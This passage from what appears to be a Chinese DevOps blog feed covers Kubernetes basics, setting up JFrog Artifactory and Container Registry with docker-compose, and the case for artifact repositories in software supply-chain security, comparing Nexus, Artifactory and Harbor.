<code>POD</code>，它可以通过模板来规范某个应用的容器镜像、端口，副本数量等。运行时副本集会监控和维护 <code>POD</code>的数量，数量过多则会下线 <code>POD</code>，过少则启动 <code>POD</code>，即扩容与缩容。 </p><h2 id="5-服务-service"><a href="#5-服务-service" class="headerlink" title="5. 服务 service"></a>5. 服务 service</h2><p>一方面，<code>POD</code> 在 <code>k8s</code> 中是不固定的，可能会挂起或者重启，且挂起重启都是不可预期的，那么这就会导致服务的 IP 也随着不停的变化，给用户的寻址造成一定的困难。</p><p>另一方面，在集群当中，创建的 IP 地址等资源，只有在同一个集群中才能访问，每个<code>POD</code> 也有独一的 IP 地址，当有多个 <code>POD</code>  提供相同的服务的时候，就需要有负载均衡的能力 。</p><p><code>service</code> 就是用来解决这些问题的，<strong>它屏蔽了应用的 IP 寻址和负载均衡，消费方可直接通过服务名来访问目标服务，寻址和负载均衡均由 <code>service</code> 底层进行</strong>。</p><h2 id="6-发布-Deployment"><a href="#6-发布-Deployment" class="headerlink" title="6. 发布 Deployment"></a>6. 发布 Deployment</h2><p>副本集就是一种基本的发布机制，可以实现基本的或者高级的应用发布，但操作较为繁琐。为了简化这些操作，<code>k8s</code> 引入了 <code>Deployment</code> 来管理 <code>ReplicaSet</code>，实现一些高级发布机制。 </p><p> <img src="/../blog-assets/Kubernetes%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/7718c6b594cee7a4eb2ea702236f6c7e.png" alt="img"> </p><h2 id="7-ConfigMap-x2F-Secret"><a href="#7-ConfigMap-x2F-Secret" class="headerlink" title="7. ConfigMap&#x2F;Secret"></a>7. ConfigMap&#x2F;Secret</h2><p>微服务在上线时需要设置一些可变配置，环境不同则配置值不同，有些配置如数据库的连接字符串在启动时就应该配好，有些配置则可以在运行中动态调整。为了实现针对不同环境灵活实现动态配置，微服务就需要 <code>ConfigMap</code> 的支持。 </p><p><code>k8s</code> 平台内置支持微服务的配置 <code>ConfigMap</code>，开发人员将配置填写在 <code>ConfigMap</code> 中，<code>k8s</code> 再 将 <code>ConfigMap</code> 中的配置以环境变量的形式注入 <code>POD</code>，这样 <code>POD</code> 中的应用就可以访问这些配置。 </p><p><code>Secret</code> 是一种特殊的 <code>ConfigMap</code>，提供更加安全的存储和访问配置机制。</p><h2 id="8-DaemonSet"><a href="#8-DaemonSet" class="headerlink" title="8. DaemonSet"></a>8. DaemonSet</h2><p>在微服务中，每个节点需要配置一个常驻守护进程。<code>DaemonSet</code> 可支持在每一个 worker 节点上面配置一个守护进程 <code>POD</code> 并且保证每一个节点上有且仅有一个 <code>POD</code>。 </p><blockquote><p>扩展阅读：<a href="https://blog.csdn.net/TM6zNf87MDG7Bo/article/details/79621510?ops_request_misc=%7B%22request_id%22:%22166011313016782184685132%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=166011313016782184685132&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-3-79621510-null-null.142%5Ev40%5Epc_rank_34_2,185%5Ev2%5Econtrol&utm_term=k8s&spm=1018.2226.3001.4187">为什么要使用 k8s ？</a> </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>DevOps</category>
      
      <category>基础知识</category>
      
      <category>Kubernetes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>Kubernetes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kubernetes 环境搭建</title>
    <link href="/2022/08/10/Kubernetes%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/08/10/Kubernetes%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>待更新</p>]]></content>
    
    
    <categories>
      
      <category>DevOps</category>
      
      <category>环境搭建</category>
      
      <category>Kubernetes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>Kubernetes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JFrog 的搭建与使用</title>
    <link href="/2022/08/07/JfrogArtifactory%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/08/07/JfrogArtifactory%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>JFrog 官方安装文档：  <a href="https://www.jfrog.com/confluence/display/JFROG/Installing+Artifactory#InstallingArtifactory-DockerComposeInstallation">Installing Artifactory - JFrog Documentation</a> </p></blockquote><h1 id="一、JFrog-Artifactory"><a href="#一、JFrog-Artifactory" class="headerlink" title="一、JFrog Artifactory"></a>一、JFrog Artifactory</h1><h2 id="1-docker-compose-启动-JFrog-Artifactory"><a href="#1-docker-compose-启动-JFrog-Artifactory" class="headerlink" title="1. docker-compose 启动 JFrog Artifactory"></a>1. docker-compose 启动 JFrog Artifactory</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /opt/docker/jfrog/artifactory &amp;&amp; <span class="hljs-built_in">cd</span> /opt/docker/jfrog/artifactory<br><span class="hljs-comment">#创建data目录并赋权，不然会启动失败</span><br><span class="hljs-built_in">mkdir</span> data &amp;&amp; <span class="hljs-built_in">chmod</span> 777 data<br><span class="hljs-comment">#创建docker-compose配置</span><br>vim docker-compose.yml<br></code></pre></td></tr></table></figure><p> 内容如下 ：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attr">services:</span><br>    <span class="hljs-attr">jfrog-oss:</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">docker.jfrog.io/jfrog/artifactory-oss</span> <span class="hljs-comment">#社区版，下载较慢</span><br>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">jfrog-oss</span>  <span class="hljs-comment">#容器名</span><br>        <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;8661:8081&#x27;</span>  <span class="hljs-comment"># Rest Api端口，用作上传拉取制品包</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;8662:8082&#x27;</span>  <span class="hljs-comment"># web访问端口，必须开放，否自报错404</span><br>        <span class="hljs-attr">volumes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">./data:/var/opt/jfrog/artifactory</span>  <span class="hljs-comment">#工作目录挂载到外部服务器</span><br></code></pre></td></tr></table></figure><p>执行命令启动 <code>jfrog-oss</code> 容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d jfrog-oss<br></code></pre></td></tr></table></figure><h2 id="2-Artifactory-的使用"><a href="#2-Artifactory-的使用" class="headerlink" title="2. Artifactory 的使用"></a>2. Artifactory 的使用</h2><p>通过 <code> http://SERVER_ HOSTNAME:8662/ui/</code> 访问web端，输入默认用户名密码 <code>admin/password</code> ：</p><p><img src="/../blog-assets/JfrogArtifactory%E6%90%AD%E5%BB%BA/1659863206702.png" alt="1659863206702"></p><p>登录成功后修改管理员密码，即可正常使用。</p><h1 id="二、JFrog-Container-Registry"><a href="#二、JFrog-Container-Registry" class="headerlink" title="二、JFrog Container Registry"></a>二、JFrog Container Registry</h1><p>因为目前 <code>Artifactory</code> 社区版仅支持<code>Maven</code>等五类仓库，暂时不支持 <code>Docker</code> ，因此需要安装 JCR（JFrog Container Registry）作为 <code>Docker</code> 镜像仓库。</p><h2 id="1-docker-compose-启动-JCR"><a href="#1-docker-compose-启动-JCR" class="headerlink" title="1. docker-compose 启动 JCR"></a>1. docker-compose 启动 JCR</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /opt/docker/jfrog/jcr &amp;&amp; <span class="hljs-built_in">cd</span> /opt/docker/jfrog/jcr<br><span class="hljs-comment">#创建data目录并赋权，不然会启动失败</span><br><span class="hljs-built_in">mkdir</span> data &amp;&amp; <span class="hljs-built_in">chmod</span> 777 data<br><span class="hljs-comment">#创建docker-compose配置</span><br>vim docker-compose.yml<br></code></pre></td></tr></table></figure><p>内容如下 ：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attr">services:</span><br>    <span class="hljs-attr">jfrog-jcr:</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">docker.bintray.io/jfrog/artifactory-jcr:latest</span> <br>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">jfrog-jcr</span>  <span class="hljs-comment">#容器名</span><br>        <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;8771:8081&#x27;</span>  <span class="hljs-comment"># Rest Api端口，用作上传拉取制品包</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;8772:8082&#x27;</span>  <span class="hljs-comment"># web访问端口，必须开放</span><br>        <span class="hljs-attr">volumes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">./data:/var/opt/jfrog/artifactory</span>  <span class="hljs-comment">#工作目录挂载到外部服务器</span><br></code></pre></td></tr></table></figure><p>执行命令启动 <code>jfrog-jcr</code> 容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d jfrog-jcr<br></code></pre></td></tr></table></figure><h2 id="2-JCR-的使用"><a href="#2-JCR-的使用" class="headerlink" title="2. JCR 的使用"></a>2. JCR 的使用</h2><p>通过 <code> http://SERVER_ HOSTIP:8772/ui/</code> 访问web端，输入默认用户名密码 <code>admin/password</code> ，登陆成功后即可创建 <code>Docker</code> 仓库：</p><p><img src="/../blog-assets/JfrogArtifactory%E6%90%AD%E5%BB%BA/1659868523300.png" alt="1659868523300"></p><h2 id="3-docker-配置-JCR-为私有仓库"><a href="#3-docker-配置-JCR-为私有仓库" class="headerlink" title="3. docker 配置 JCR 为私有仓库"></a>3. docker 配置 JCR 为私有仓库</h2><h3 id="3-1-JCR-新建仓库"><a href="#3-1-JCR-新建仓库" class="headerlink" title="3.1 JCR 新建仓库"></a>3.1 JCR 新建仓库</h3><p>在 <code>Repositories</code> 下创建名为 <code>springbootdemo</code>的 <code>Docker</code>local 仓库：</p><p><img src="/../blog-assets/JfrogArtifactory%E6%90%AD%E5%BB%BA/1659946671813.png" alt="1659946671813"></p><p><img src="/../blog-assets/JfrogArtifactory%E6%90%AD%E5%BB%BA/1659946715124.png" alt="1659946715124"></p><h3 id="3-2-配置私有仓库"><a href="#3-2-配置私有仓库" class="headerlink" title="3.2 配置私有仓库"></a>3.2 配置私有仓库</h3><p>在 <code>docker</code> 服务器上修改配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改配置文件<br>vim /etc/docker/daemon.json<br></code></pre></td></tr></table></figure><p>添加 JCR 仓库地址：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;insecure-registries&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;SERVER_ HOSTIP:8771&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;registry-mirrors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;https://27vm8t5e.mirror.aliyuncs.com&quot;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>添加完成后重启<code>docker</code> 使配置生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl restart docker<br></code></pre></td></tr></table></figure><h3 id="3-3-上传和拉取镜像"><a href="#3-3-上传和拉取镜像" class="headerlink" title="3.3 上传和拉取镜像"></a>3.3 上传和拉取镜像</h3><p>上传和拉取镜像前，需要登录私有仓库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker login -u 用户名 -p 密码 SERVER_ HOSTIP:8771<br></code></pre></td></tr></table></figure><h4 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h4><p>成功登录后，打包上传镜像，这里要上传的镜像是<code>springboot:v1</code> ，注意以下命令中的<code>springbootdemo</code> 就是我们创建的仓库名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 标记镜像并归入私有仓库</span><br>docker tag springboot:v1 SERVER_ HOSTIP:8771/springbootdemo/springboot:v1<br><span class="hljs-comment"># 上传至私有仓库</span><br>docker push SERVER_ HOSTIP:8771/springbootdemo/springboot:v1<br></code></pre></td></tr></table></figure><p>上传成功后，在 <code>JCR</code> Web端查看：</p><p><img src="/../blog-assets/JfrogArtifactory%E6%90%AD%E5%BB%BA/1659947843896.png" alt="1659947843896"></p><h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><p>使用以下命令拉取仓库中的镜像即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull SERVER_ HOSTIP:8771/springbootdemo/springboot:v1<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>DevOps</category>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DevOps（三）制品与制品库</title>
    <link href="/2022/08/06/%E5%88%B6%E5%93%81%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/08/06/%E5%88%B6%E5%93%81%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="一、什么是制品与制品库？"><a href="#一、什么是制品与制品库？" class="headerlink" title="一、什么是制品与制品库？"></a>一、什么是制品与制品库？</h1><h2 id="制品"><a href="#制品" class="headerlink" title="制品"></a><strong>制品</strong></h2><p>由源码编译打包生成的二进制文件（jar、war、镜像等），不同的开发语言对应着不同格式的二进制文件，这些二进制通常可以直接运行在服务器上。 </p><p><strong>按照使用场景，制品大致分为三类</strong></p><ol><li>外部引入的第三方组件（<code>Maven</code>、<code>Npm</code>等）；</li><li>产品内部依赖包，公共<code>SDK</code>；</li><li>产品交付安装包（<code>jar</code>包，<code>docker</code>镜像等）。</li></ol><h2 id="制品库"><a href="#制品库" class="headerlink" title="制品库"></a><strong>制品库</strong></h2><p>用来统一管理不同格式的软件制品。 除了基本的存储功能，还提供了<strong>版本控制</strong>、<strong>访问控制</strong>、<strong>安全扫描</strong>、<strong>依赖分析</strong>等重要功能，是一种企业处理软件开发过程中产生的所有包类型的标准化方式。 </p><p> <img src="/../blog-assets/%E5%88%B6%E5%93%81%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/20200331235427601.png" alt="img"> </p><h1 id="二、为什么我们需要制品库？"><a href="#二、为什么我们需要制品库？" class="headerlink" title="二、为什么我们需要制品库？"></a>二、为什么我们需要制品库？</h1><p>目前常规的制品管理存在如下问题：</p><ul><li><p><strong>外部依赖下载速度慢</strong>；</p></li><li><p><strong>安全漏洞风险</strong>：第三方依赖包的安全风险管理形同虚设，或者滞后；针对引入进来的第三组件没有进行组件扫描，极易引入漏洞；</p></li><li><p><strong>版本管理混乱</strong>：交付包使用<code>FTP</code>或者<code>SVN</code>进行管理，管理粒度相对较粗；由于受到监管约束，一键部署是不可能任务，跨网段的包交付智能依赖于手工拷贝；</p></li><li><p><strong>制品存储风险</strong>：团队内部搭建的制品库是单点的，缺乏集群部署；</p></li><li><p><strong>资源浪费</strong>：因为没有统一的制品库，存在重复建设的问题；维护成本高，或者说目前根本就没有维护；</p></li></ul><h2 id="1-安全风险"><a href="#1-安全风险" class="headerlink" title="1. 安全风险"></a>1. 安全风险</h2><p>从底层操作系统、到容器、开源脚手架、再到三方组件，我们在系统开发过程中引用着越来越多的开源组件，研发效率确实是提升上去了，但是带来的安全风险是越来越高。从以下图可以看出来，我们自己写的代码量只占了0.1%，但对应的第三方依赖却占了99.9%。因此，对于制品的管理（包括版本管理、风险管理）就尤其显得重要。另外，已知30%的<code>Docker</code>镜像，14%的 <code>npm package</code>，59%的<code>maven</code>中央库都还包含已知漏洞，而且漏洞平均修复周期约为2年。</p><h2 id="2-组件准入"><a href="#2-组件准入" class="headerlink" title="2. 组件准入"></a>2. 组件准入</h2><p>拿 <code>maven</code>举例子吧，程序员只需在<code>pom</code>文件配一个新依赖就可直接从中央库上拉取一个不知名的三方包，当然一般有点血性的同学还是会拉取高知名度的三方包；而且最要命的是你根本都不知道整个研发团队的组件引用情况是怎样的，因此你的整体风险评估根本无法下手做。根据2018年<strong>synk</strong>发布的信息安全状态报告，可以从以下两个维度去告诉你风险在哪里：</p><ul><li>从趋势上来说，<code>maven</code>中央库新增漏洞在2018年增长了27%，<code>npm</code>则增长了47%（如下图左）。随着我们工程的依赖越多，我们引入漏洞的风险几率也是正比增加的； </li><li>从依赖层次来说，**<code>npm</code>、<code>Maven</code>和<code>Ruby</code>中的大多数依赖项都是间接依赖项**，间接依赖项中的漏洞占总体漏洞的 78%（如下图右），这样就使得<ul><li>通过人工发现的依赖漏洞变得越困难，因为漏洞藏得越深；</li><li>漏洞发现后的修复工作需要更长时间。而根据过往经验，在一天或更短的时间内解决高危或关键漏洞的基本是很困难。</li></ul></li></ul><p><img src="/../blog-assets/%E5%88%B6%E5%93%81%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659854270127.png" alt="1659854270127"></p><h2 id="3-版本溯源"><a href="#3-版本溯源" class="headerlink" title="3. 版本溯源"></a>3. 版本溯源</h2><p>从下图可以看出来<strong>制品管理</strong>就是我们整个<code>DevOps</code>流水线的枢纽。首先，它控制着部署包的按配置规则<strong>自动分发部署</strong>，可以避免人工因操作失误带来的版本问题；其次，它是可以设成<strong>自动化</strong>，让分发部署变成一种自助式服务；具体可以问问你旁边的同事，你问问他们更愿意用APP、ATM机还是人工柜台去转账，道理就不言自明。 </p><ul><li><p>如果版本发布错误怎么办？如何追溯？</p></li><li><p>如果版本引入了安全漏洞怎么办？推到重来，业务方允许吗？</p></li><li><p>生产问题紧急发版测试，手工传包的同事无法及时支持怎么办？估计开发要被拉去祭天了。</p></li></ul><p>只有引入了制品库，才能真正实践 <strong>Once Integration，Run anytime anywhere</strong>，才能真正无缝实现所测即所部署。</p><h1 id="三、如何管控？"><a href="#三、如何管控？" class="headerlink" title="三、如何管控？"></a>三、如何管控？</h1><blockquote><p>相关知识扩展：</p><ul><li><code>SIT</code>和<code>UAT</code> ： <a href="https://blog.csdn.net/qq646642124/article/details/93326241?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-93326241-blog-87865727.pc_relevant_multi_platform_whitelistv3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-93326241-blog-87865727.pc_relevant_multi_platform_whitelistv3&utm_relevant_index=1">什么的SIT测试？什么是UAT测试？</a></li><li><code>SIT</code>：系统集成测试</li><li><code>UAT</code>：用户验收测试</li><li><code>DMZ</code> 区： <a href="https://www.bbsmax.com/A/gAJGVQLbzZ/">图解DMZ </a> </li><li><code>DMZ</code> 就是一个让物理位置在内网，希望被外网访问的一个主机区域（通常用来放 <code>Web</code>服务器、<code>Mail</code>服务器；</li><li><code>DMZ</code>区域是由网络防火墙设置规则而隔离出来的一个逻辑区域，该区域里的主机<strong>内网和外网用户均可以访问</strong>， <strong>但这些主机不能主动访问内网</strong>，从而来保护内部网络的安全 ；</li><li>要想实现<code>DMZ</code>功能，其实借助<code>Linux</code>提供的<code>iptables</code>&#x2F;<code>netfilter</code>即可实现。只需打上几条防火墙规则即可。只需打上NAT规则即可。将路由器IP <code>DNAT</code>为<code>DMZ</code>主机IP，将<code>DMZ</code>主机IP <code>SNAT</code>为路由器IP；</li><li><code>DNAT</code> 和 <code>SNAT</code> ： <a href="https://blog.csdn.net/jkwanga/article/details/106199387">SNAT与DNAT的区别</a></li></ul></blockquote><h2 id="1-安全左移"><a href="#1-安全左移" class="headerlink" title="1. 安全左移"></a>1. 安全左移</h2><p>目前由于我们的第三方组件扫描都是滞后的，当我们的版本基本上到了<code>SIT</code>或<code>UAT</code>测试尾声才交付给信息安全进行组件扫描。如果这个时候扫描出一些第三方组件有严重的安全漏洞。那还要不要投产？如果继续投，我们是求神拜佛保佑漏洞不被发现且利用吗？如果修复后再脱产，因为部分可能涉及到底层框架的改动（如<code>Spring</code>这类），如果要在临近投产的这么短时间内完成改造首先不现实，其次是高风险，同时也有可能会导致项目延期。</p><p>那应该要怎么办呢？对了，进行<strong>安全左移</strong>。如果要实现安全左移，需要从策略、流程、工具、培训四个维度开展。 </p><ol><li>要把安全策略从被动转为主动，把组件扫描前置到开发过程中 ；</li><li>对于源码的交付也要设置安全准入，如组件扫描中的<code>CVE</code>漏洞不能出现中高危；</li><li>工具层面， <strong>JFrog Xray</strong> 能够在开发IDE端侦听<code>POM</code>文件的依赖及依赖传递的变化，一旦<code>POM</code>文件发生任何变化，Xray就可以对该工程的所有的依赖进行深度递归扫描，将扫描结果呈现在IDE上，让开发马上收到关于该新引进组件的安全情况反馈 ；</li><li>安全左移的最后一步，就是确保作为编码主体的人员在开发初期便创建安全的代码， 因此，信息安全开发层面的培训还是得跟上。</li></ol><h2 id="2-建立安全白名单制度"><a href="#2-建立安全白名单制度" class="headerlink" title="2. 建立安全白名单制度"></a>2. 建立安全白名单制度</h2><p>参考 JFrog 的 一些解决方案如下：</p><ol><li>在外网建立安全漏洞库，开源的可以从<code>NVD</code>、<code>VnlrDB</code>定时更新，商业可以购买<strong>synk</strong>的服务；同步建设有白名单制度用于特殊包申请，统一整合到整体的信任规则库； </li><li>在<code>DMZ</code>区建设<code>DMZ</code>代理公网镜像仓库，根据安全漏洞库的规则过滤从公网上拉取第三方包。如果第三方包是被扫描到漏洞的，则禁止拉取到内网的制品仓库。</li></ol><p><img src="/../blog-assets/%E5%88%B6%E5%93%81%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659857184519.png" alt="1659857184519"></p><h2 id="3-使用制品库进行组件版本溯源"><a href="#3-使用制品库进行组件版本溯源" class="headerlink" title="3. 使用制品库进行组件版本溯源"></a>3. 使用制品库进行组件版本溯源</h2><p>传统制品仓库无法管理构建过程，因此对构建过程中的依赖也无法统一管理，该部署包具体含有多少个依赖包，依赖包的二级依赖包又有什么包，完全是两眼一抹黑。因此，这时候就需要对二进制制品的所有内容有一个清晰的视图，它需要提供以下功能： </p><ol><li><p>正反向依赖：能够清楚知道应用程序引入的依赖组件清单，同时能够知道某个依赖组件的使用范围；</p></li><li><p>依赖可用性：能够通过人工识别，工具扫描等方式判断依赖组件的可用性；</p></li><li><p>依赖控制：当某个依赖组件不可用时能够根据组件的严重级别实施不同的控制策略；</p></li><li><p>依赖知识库：沉淀依赖组件知识库，能够记录依赖组件的基本信息，问题记录，黑名单，白名单。当开发人员在引入组件时就能知道依赖组件是否可用，而不需要到后面的阶段在被拦截；</p></li><li><p>依赖度量：度量依赖组件使用情况，能够通过统计图表的展现形式统计组件的最多使用，以及分布，问题版本统计，问题版本产生的问题统计，以及特定时间范围内的趋势。</p></li></ol><p>目前， <code>Nexus</code> 没有针对编译包的整个依赖管理及正反向解析功能，而<code>Artifactory </code>将构建任务、构建历史及依赖信息有条理地管理起来，方便对正反向依赖进行追踪，能够清晰了解安全威胁传递的路径、影响范围(项目、团队、产品)等信息，能够为开发人员提供可视化的能力。 </p><h1 id="四、制品管理工具"><a href="#四、制品管理工具" class="headerlink" title="四、制品管理工具"></a>四、制品管理工具</h1><p>综上所述，由于制品管理的重要性，所以衍生出来对应的制品解决方案用来统一管理不同格式的软件制品，即制品库工具。</p><p> <img src="/../blog-assets/%E5%88%B6%E5%93%81%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/16467bd63d84d19059fd4c92ab9ceede.png" alt="img"> </p><p> 目前主市场上主流的制品管理工具主要有<code>Nexus</code>、<code>JFrog Artifactory</code>、<code>Harbor</code>等 ，接下来将一一介绍。</p><h2 id="1-Nexus"><a href="#1-Nexus" class="headerlink" title="1. Nexus"></a>1. Nexus</h2><p><code>Nexus</code>是一套“开箱即用”的系统不需要数据库，它使用文件系统加Lucene来组织数据。Nexus 使用ExtJS来开发界面，利用Restlet来提供完整的REST APIs，通过m2eclipse与Eclipse集成使用。Nexus支持WebDAV与LDAP安全身份认证。 </p><p><img src="/../blog-assets/%E5%88%B6%E5%93%81%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/72b9bd6656ec6e252ba4eaa79771a127.png" alt="image.png"> </p><p><code>Nexus</code>是少有的<strong>支持几乎所有主流制品格式</strong>，并且提供免费版的制品管理产品，这也是大多数中小公司的选择，可以满足大部分业务场景，但是，<strong>免费版不提供高可用方案</strong>。 </p><h2 id="2-JFrog-Artifactory"><a href="#2-JFrog-Artifactory" class="headerlink" title="2. JFrog Artifactory"></a>2. JFrog Artifactory</h2><p><code>JFrog</code>是一家以色列公司，专注于制品管理环境，提供商用的解决方案，所以它的产品是要花钱的。 </p><p><img src="/../blog-assets/%E5%88%B6%E5%93%81%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/38f4edf6c452e175a0f7c1064046b11d.png" alt="image.png"> </p><p>下图列出了<code>JFrog Artifactory</code>和<code>Nexus</code>的产品特点对比，仅供参考。既然是掏钱买的，肯定比免费的Nexus提供的支持和服务更多，包括高可用，组件的漏洞风险分析，多地分发等等。不是说Nexus不行，而是我们大家用的大部分都是Nexus的免费版，其实它的收费版也提供类似的方案。</p><p><img src="/../blog-assets/%E5%88%B6%E5%93%81%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/6f913dc0fb572f8cb845b621587b812d.png" alt="image.png"> </p><h2 id="3-Harbor"><a href="#3-Harbor" class="headerlink" title="3. Harbor"></a>3. Harbor</h2><p><code>Harbor</code>是VMware公司开源的企业级Docker Registry项目，其目标是帮助用户迅速搭建一个企业级的Docker registry服务。  提供了管理UI，基于角色的访问控制，AD&#x2F;LDAP集成、以及审计日志等企业用户需求的功能，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源 Docker Distribution。 </p><p><code>Harbor</code>目前已经成为私有Docker&#x2F;Helm管理的主要工具，相比于<code>Nexus</code>, <code>Harbor</code>在docker镜像的管理方面更有优势，提供镜像同步服务，支持团队项目隔离。 </p><blockquote><p>参考文章： <a href="https://blog.csdn.net/libin95188/article/details/123602609?ops_request_misc=%7B%22request_id%22:%22165985766416781685342377%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165985766416781685342377&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-2-123602609-null-null.142%5Ev39%5Epc_rank_34_2,185%5Ev2%5Econtrol&utm_term=DevOps%E4%B8%AD%E5%88%B6%E5%93%81%E5%BA%93%E7%9A%84%E9%80%89%E6%8B%A9&spm=1018.2226.3001.4187">聊聊DevOps制品管理</a> </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>DevOps</category>
      
      <category>基础知识</category>
      
      <category>制品与制品库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Harbor</tag>
      
      <tag>Jfrog</tag>
      
      <tag>Nexus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DevOps（二）初识 Jenkins</title>
    <link href="/2022/08/01/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/08/01/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
